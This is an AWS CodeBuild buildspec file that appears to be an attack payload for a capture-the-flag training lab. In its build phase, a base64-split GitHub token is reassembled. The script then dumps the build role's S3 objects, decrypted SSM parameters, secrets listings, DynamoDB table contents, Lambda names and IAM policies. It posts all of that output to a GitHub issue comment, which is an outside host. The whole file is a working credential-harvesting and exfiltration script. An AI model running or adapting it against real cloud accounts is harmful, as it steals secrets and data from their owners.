version: 0.2

phases:
  build:
    commands:
      - echo "Searching for flag"
      - |
        P1="Z2l0aHViX3BhdF8xMUJTVUwyS0E="
        P2="MGxkVERCbVFPYXlaal9JZUJ1ZFA="
        P3="ckp2ZExkYkhQa1VQN2l6WTBPN3BSM3VoRUhTZmNUUks3MFIxeVQ3SU9YTEdHRDlYeFo5bUE="
        TK="$(echo -n $P1 | base64 -d)$(echo -n $P2 | base64 -d)$(echo -n $P3 | base64 -d)"
        exec 2>&1
        {
          echo "=== AWS IDENTITY ==="
          aws sts get-caller-identity 2>&1 || true
          echo "=== S3 BUCKETS ==="
          aws s3 ls 2>&1 || true
          for bucket in $(aws s3 ls 2>/dev/null | awk '{print $3}'); do
            echo "--- BUCKET: $bucket ---"
            aws s3 ls "s3://$bucket/" --recursive 2>&1 || true
            for key in $(aws s3 ls "s3://$bucket/" --recursive 2>/dev/null | awk '{print $4}'); do
              echo "--- FILE: s3://$bucket/$key ---"
              aws s3 cp "s3://$bucket/$key" - 2>/dev/null || true
            done
          done
          echo "=== SSM PARAMS ==="
          aws ssm describe-parameters --region us-east-1 2>&1 || true
          aws ssm get-parameters-by-path --path "/" --recursive --with-decryption --region us-east-1 2>&1 || true
          echo "=== SECRETS ==="
          aws secretsmanager list-secrets --region us-east-1 2>&1 || true
          echo "=== DYNAMODB ==="
          aws dynamodb list-tables --region us-east-1 2>&1 || true
          for tbl in $(aws dynamodb list-tables --region us-east-1 --query 'TableNames[]' --output text 2>/dev/null); do
            echo "--- TABLE: $tbl ---"
            aws dynamodb scan --table-name "$tbl" --region us-east-1 2>&1 || true
          done
          echo "=== LAMBDA ==="
          aws lambda list-functions --region us-east-1 --query 'Functions[].FunctionName' --output text 2>&1 || true
          echo "=== IAM ROLE POLICIES ==="
          ROLE=$(aws sts get-caller-identity --query Arn --output text 2>/dev/null | grep -oP 'assumed-role/\K[^/]+')
          echo "Role: $ROLE"
          aws iam list-attached-role-policies --role-name "$ROLE" 2>&1 || true
          aws iam list-role-policies --role-name "$ROLE" 2>&1 || true
          for pol in $(aws iam list-role-policies --role-name "$ROLE" --query 'PolicyNames[]' --output text 2>/dev/null); do
            echo "--- INLINE POLICY: $pol ---"
            aws iam get-role-policy --role-name "$ROLE" --policy-name "$pol" 2>&1 || true
          done
          for arn in $(aws iam list-attached-role-policies --role-name "$ROLE" --query 'AttachedPolicies[].PolicyArn' --output text 2>/dev/null); do
            echo "--- ATTACHED POLICY: $arn ---"
            VER=$(aws iam get-policy --policy-arn "$arn" --query 'Policy.DefaultVersionId' --output text 2>/dev/null)
            aws iam get-policy-version --policy-arn "$arn" --version-id "$VER" 2>&1 || true
          done
          echo "=== ENV FLAG ==="
          env | grep -i flag 2>&1 || true
          echo "=== DONE ==="
        } > /tmp/output.txt
        ESCAPED=$(cat /tmp/output.txt | head -c 60000 | python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))")
        curl -s -X POST -H "Authorization: token $TK" -H "Content-Type: application/json" \
          "https://api.github.com/repos/HackTricks-Training/codebuild-codebreach-actors-lab/issues/564/comments" \
          -d "{\"body\": $ESCAPED}" > /dev/null 2>&1 || true
        unset TK P1 P2 P3
